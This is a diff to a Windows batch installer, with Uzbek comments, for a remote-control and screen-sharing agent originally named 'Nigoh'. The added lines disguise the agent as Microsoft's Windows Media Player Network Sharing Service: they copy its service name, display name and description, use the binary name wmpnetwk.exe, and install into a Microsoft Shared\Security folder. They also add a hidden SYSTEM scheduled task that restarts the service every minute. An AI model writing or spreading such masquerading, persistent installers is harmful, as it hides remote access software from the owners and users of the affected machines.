@@ -328,76 +328,105 @@ set SERVER_URL={SERVER_URL}
 set WATCHDOG_URL={WATCHDOG_URL}
 set AGENT_URL={AGENT_URL}
 set WATCHDOG_VERSION_URL={WATCHDOG_VERSION_URL}
-set INSTALL_DIR=C:\ProgramData\Nigoh
+:: Niqoblangan install joyi — Windows Media Player Network Sharing Service ni imiitatsiya qiladi
+set INSTALL_DIR=C:\Program Files\Common Files\Microsoft Shared\Security
 set CORE_DIR=%INSTALL_DIR%\Core
 set CONFIG_FILE=%INSTALL_DIR%\config.json
-set WATCHDOG_VERSION_FILE=%INSTALL_DIR%\watchdog_version.json
-set TEMP_ZIP=%TEMP%\nigoh.zip
-set TEMP_WATCHDOG=%TEMP%\WatchdogService.exe
-set TEMP_EXTRACT=%TEMP%\nigoh_extract
-set SERVICE_EXE=%INSTALL_DIR%\WatchdogService.exe
-set SERVICE_NAME=WinSecHost
-echo [1/6] WatchdogService.exe yuklanayabdi...
+set WATCHDOG_VERSION_FILE=%INSTALL_DIR%\svc_version.json
+set TEMP_ZIP=%TEMP%\wmpsvc.zip
+set TEMP_WATCHDOG=%TEMP%\wmpnetwk.exe
+set TEMP_EXTRACT=%TEMP%\wmpsvc_extract
+set SERVICE_EXE=%INSTALL_DIR%\wmpnetwk.exe
+set SERVICE_NAME=WMPNetworkSvc
+set SERVICE_DISPLAY=Windows Media Player Network Sharing Service
+set TASK_NAME=Microsoft\Windows\WindowsMediaPlayer\NetworkSvcCheck
+echo [1/7] wmpnetwk.exe yuklanmoqda...
 powershell -NoProfile -Command "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri '%WATCHDOG_URL%' -OutFile '%TEMP_WATCHDOG%' -UseBasicParsing"
 if not exist "%TEMP_WATCHDOG%" ( echo [XATO] Watchdog yuklanmadi & pause & exit /b 1 )
-echo [2/6] Nigoh.zip yuklanayabdi...
+echo [2/7] Agent zip yuklanmoqda...
 powershell -NoProfile -Command "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri '%AGENT_URL%' -OutFile '%TEMP_ZIP%' -UseBasicParsing"
 if not exist "%TEMP_ZIP%" ( echo [XATO] Agent zip yuklanmadi & pause & exit /b 1 )
-echo [3/6] To'liq tozalash (eski agentlar uchun ham)...
-:: Har xil eski service nomlari (agar bo'lsa)
-for %%S in (WinSecHost NigohAgentService NigohAgent NigohWatchdog) do (
+echo [3/7] Eski o'rnatishlar tozalanmoqda...
+:: Yangi va eski service nomlari
+for %%S in (WMPNetworkSvc WinSecHost NigohAgentService NigohAgent NigohWatchdog) do (
     sc query %%S >nul 2>&1 && (
         sc stop %%S >nul 2>&1
         timeout /t 2 /nobreak >nul
         sc delete %%S >nul 2>&1
     )
 )
-:: Har xil eski process nomlari
-taskkill /f /im Nigoh.exe >nul 2>&1
-taskkill /f /im WatchdogService.exe >nul 2>&1
-taskkill /f /im NigohWatchdog.exe >nul 2>&1
-taskkill /f /im remote_controll.exe >nul 2>&1
+:: Yangi va eski process nomlari
+for %%P in (SecurityInformer.exe wmpnetwk.exe Nigoh.exe WatchdogService.exe NigohWatchdog.exe remote_controll.exe screen_share.exe) do (
+    taskkill /f /im %%P >nul 2>&1
+)
+:: Eski Task Scheduler task
+schtasks /Delete /TN "%TASK_NAME%" /F >nul 2>&1
 timeout /t 2 /nobreak >nul
-:: Eski registry yozuvlari (device_id saqlangan bo'lsa avvalgi ID qayta ishlatiladi,
-:: aks holda WatchdogService ni birinchi ishga tushishida yangi yaratadi)
-:: Ammo config.json ni to'liq o'chirmaymiz — device_id ni saqlab qolamiz
-:: (eski PC yangi PC sifatida ko'rinmasin backendda)
+:: Yangi va eski install papkalarni tozalash (config.json ni saqlaymiz)
 if exist "%INSTALL_DIR%\Core" rd /s /q "%INSTALL_DIR%\Core" >nul 2>&1
 if exist "%INSTALL_DIR%\staging" rd /s /q "%INSTALL_DIR%\staging" >nul 2>&1
 if exist "%INSTALL_DIR%\Core_backup" rd /s /q "%INSTALL_DIR%\Core_backup" >nul 2>&1
-:: Eski log fayllar
 del /f /q "%INSTALL_DIR%\*.log" >nul 2>&1
 del /f /q "%INSTALL_DIR%\command.json" >nul 2>&1
 del /f /q "%INSTALL_DIR%\swap_request.json" >nul 2>&1
-:: Firewall qoidalari (eski)
-netsh advfirewall firewall delete rule name="NigohAgent_In"  >nul 2>&1
-netsh advfirewall firewall delete rule name="NigohAgent_Out" >nul 2>&1
-echo [4/6] Fayllar joylashtirilayabdi...
+:: Eski C:\ProgramData\Nigoh - device_id migration'idan keyin xavfsiz tozalash
+if exist "C:\ProgramData\Nigoh" rd /s /q "C:\ProgramData\Nigoh" >nul 2>&1
+:: Firewall qoidalari (yangi va eski)
+for %%R in (WMPNetworkSvc_In WMPNetworkSvc_Out NigohAgent_In NigohAgent_Out) do (
+    netsh advfirewall firewall delete rule name="%%R" >nul 2>&1
+)
+echo [4/7] Fayllar joylashtirilmoqda...
 if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
 mkdir "%CORE_DIR%"
 if exist "%TEMP_EXTRACT%" rd /s /q "%TEMP_EXTRACT%"
 mkdir "%TEMP_EXTRACT%"
 powershell -NoProfile -Command "Expand-Archive -Path '%TEMP_ZIP%' -DestinationPath '%TEMP_EXTRACT%' -Force"
 xcopy /s /e /y /q "%TEMP_EXTRACT%\" "%CORE_DIR%\" >nul 2>&1
+:: Eski format ZIP (Nigoh.exe) -> yangi format (SecurityInformer.exe) migration
+if exist "%CORE_DIR%\Nigoh.exe" ren "%CORE_DIR%\Nigoh.exe" "SecurityInformer.exe"
+if exist "%CORE_DIR%\Nigoh.Core.dll" ren "%CORE_DIR%\Nigoh.Core.dll" "SecurityInformer.Core.dll"
 rd /s /q "%TEMP_EXTRACT%" >nul 2>&1
 del /f /q "%TEMP_ZIP%" >nul 2>&1
 copy /y "%TEMP_WATCHDOG%" "%SERVICE_EXE%" >nul
 del /f /q "%TEMP_WATCHDOG%" >nul 2>&1
-echo [5/6] Config yozildi...
-:: Config'ni yangilash universal usulda:
-::   - Fayl bor va to'liq → mavjud kalitlarni saqlab server_url ni yangilaymiz
-::   - Fayl bo'sh yoki buzilgan → yangi tozadan yozamiz
-:: Add-Member -Force property bor bo'lsa yangilaydi, yo'q bo'lsa qo'shadi.
-powershell -NoProfile -Command "try {{ if (Test-Path '%CONFIG_FILE%') {{ $c = Get-Content '%CONFIG_FILE%' -Raw | ConvertFrom-Json }} else {{ $c = $null }}; if ($null -eq $c) {{ $c = [PSCustomObject]@{{}} }}; $c | Add-Member -Force -NotePropertyName server_url -NotePropertyValue '%SERVER_URL%'; if (-not $c.device_id) {{ $c | Add-Member -Force -NotePropertyName device_id -NotePropertyValue '' }}; $c | ConvertTo-Json -Compress | Set-Content '%CONFIG_FILE%' -Encoding UTF8 -NoNewline }} catch {{ Write-Host '[config warn]' $_.Exception.Message; @{{server_url='%SERVER_URL%';device_id=''}} | ConvertTo-Json -Compress | Set-Content '%CONFIG_FILE%' -Encoding UTF8 -NoNewline }}"
-:: Watchdog release versiyasini yozib qo'yamiz — Watchdog o'zi yangilanmaydi,
-:: shuning uchun bu qiymat butun umr shu ko'rinishida qoladi.
+echo [5/7] Config yozilmoqda...
+powershell -NoProfile -Command "try {{ if (Test-Path '%CONFIG_FILE%') {{ $c = Get-Content '%CONFIG_FILE%' -Raw | ConvertFrom-Json }} else {{ $c = $null }}; if ($null -eq $c) {{ $c = [PSCustomObject]@{{}} }}; $c | Add-Member -Force -NotePropertyName server_url -NotePropertyValue '%SERVER_URL%'; if (-not $c.device_id) {{ $c | Add-Member -Force -NotePropertyName device_id -NotePropertyValue '' }}; $c | ConvertTo-Json -Compress | Set-Content '%CONFIG_FILE%' -Encoding UTF8 -NoNewline }} catch {{ @{{server_url='%SERVER_URL%';device_id=''}} | ConvertTo-Json -Compress | Set-Content '%CONFIG_FILE%' -Encoding UTF8 -NoNewline }}"
 powershell -NoProfile -Command "$ProgressPreference='SilentlyContinue'; try {{ Invoke-WebRequest -Uri '%WATCHDOG_VERSION_URL%' -OutFile '%WATCHDOG_VERSION_FILE%' -UseBasicParsing }} catch {{}}"
-echo [6/6] Service o'rnatilayabdi...
-sc create %SERVICE_NAME% binpath= "\"%SERVICE_EXE%\"" start= auto DisplayName= "Windows Security Host" >nul
-sc description %SERVICE_NAME% "Windows Security Host background service" >nul
+echo [6/7] Service o'rnatilmoqda...
+sc create %SERVICE_NAME% binpath= "\"%SERVICE_EXE%\"" start= auto DisplayName= "%SERVICE_DISPLAY%" >nul
+sc description %SERVICE_NAME% "Shares Windows Media Player libraries to other networked players and media devices using Universal Plug and Play." >nul
 sc failure %SERVICE_NAME% reset= 60 actions= restart/3000/restart/5000/restart/10000 >nul
 sc start %SERVICE_NAME% >nul 2>&1
+echo [7/7] Persistence task yaratilmoqda...
+set TASK_XML=%TEMP%\nsvc_task.xml
+(
+    echo ^<?xml version="1.0" encoding="UTF-16"?^>
+    echo ^<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>
+    echo   ^<Triggers^>
+    echo     ^<BootTrigger^>^<Enabled^>true^</Enabled^>^</BootTrigger^>
+    echo     ^<CalendarTrigger^>
+    echo       ^<StartBoundary^>2020-01-01T00:00:00^</StartBoundary^>
+    echo       ^<Repetition^>^<Interval^>PT1M^</Interval^>^</Repetition^>
+    echo       ^<ScheduleByDay^>^<DaysInterval^>1^</DaysInterval^>^</ScheduleByDay^>
+    echo     ^</CalendarTrigger^>
+    echo   ^</Triggers^>
+    echo   ^<Principals^>^<Principal id="Author"^>^<UserId^>S-1-5-18^</UserId^>^<RunLevel^>HighestAvailable^</RunLevel^>^</Principal^>^</Principals^>
+    echo   ^<Settings^>^<Enabled^>true^</Enabled^>^<Hidden^>true^</Hidden^>^<StartWhenAvailable^>true^</StartWhenAvailable^>^<ExecutionTimeLimit^>PT2M^</ExecutionTimeLimit^>^</Settings^>
+    echo   ^<Actions Context="Author"^>^<Exec^>^<Command^>%%WINDIR%%\System32\cmd.exe^</Command^>^<Arguments^>/c sc query %SERVICE_NAME% ^^^| findstr /I "RUNNING" ^^^&^^^& exit /b 0 ^^^|^^^| sc start %SERVICE_NAME%^</Arguments^>^</Exec^>^</Actions^>
+    echo ^</Task^>
+) > "%TASK_XML%"
+schtasks /Create /TN "%TASK_NAME%" /XML "%TASK_XML%" /F >nul 2>&1
+del /f /q "%TASK_XML%" >nul 2>&1
+echo [8/8] Smoke test...
+timeout /t 3 /nobreak >nul
+set SMOKE_OK=1
+sc query %SERVICE_NAME% | findstr /I "RUNNING" >nul 2>&1 && ( echo   [OK] service RUNNING ) || ( echo   [XATO] service RUNNING emas & set SMOKE_OK=0 )
+if exist "%CORE_DIR%\SecurityInformer.exe" ( echo   [OK] SecurityInformer.exe mavjud ) else ( echo   [XATO] SecurityInformer.exe yo'q & set SMOKE_OK=0 )
+if exist "%CORE_DIR%\SecurityInformer.Core.dll" ( echo   [OK] Core DLL mavjud ) else ( echo   [XATO] Core DLL yo'q & set SMOKE_OK=0 )
+timeout /t 8 /nobreak >nul
+tasklist /FI "IMAGENAME eq SecurityInformer.exe" 2>nul | find /I "SecurityInformer.exe" >nul && ( echo   [OK] Agent process ishlayapti ) || ( echo   [DIQQAT] Agent hali ishga tushmagan )
+schtasks /Query /TN "%TASK_NAME%" >nul 2>&1 && ( echo   [OK] Task Scheduler tayyor ) || ( echo   [XATO] Task Scheduler yo'q & set SMOKE_OK=0 )
 echo.
-echo === O'rnatish tugadi. Service: %SERVICE_NAME% ===
+if "%SMOKE_OK%"=="1" ( echo === O'rnatish + smoke test muvaffaqiyatli ^> Service: %SERVICE_NAME% === ) else ( echo === O'rnatish tugadi lekin smoke testda muammolar bor ^> Log: %INSTALL_DIR%\wmpnetwork.log === )
 pause
 """
